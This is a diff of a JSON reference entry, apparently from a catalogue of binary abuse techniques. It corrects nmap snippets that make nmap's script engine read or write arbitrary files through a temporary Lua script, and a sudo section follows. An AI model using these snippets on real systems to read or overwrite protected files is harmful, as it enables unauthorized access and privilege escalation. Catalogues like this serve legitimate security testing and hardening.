@@ -44,7 +44,7 @@
     ],
     "file-write": [
       {
-        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"wb\"); f:write(\"[data]\"); io.close(f);' > $TF\nnmap --script=$TF\n"
+        "code": "TF=$(mktemp)\necho 'local f=io.open(\"[file]\", \"wb\"); f:write(\"[data]\"); io.close(f);' > $TF\nnmap --script=$TF\n"
       },
       {
         "description": "The payload appears inside the regular nmap output.",
@@ -53,7 +53,7 @@
     ],
     "file-read": [
       {
-        "code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"
+        "code": "TF=$(mktemp)\necho 'local f=io.open(\"[file]\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"
       }
     ],
     "sudo": [
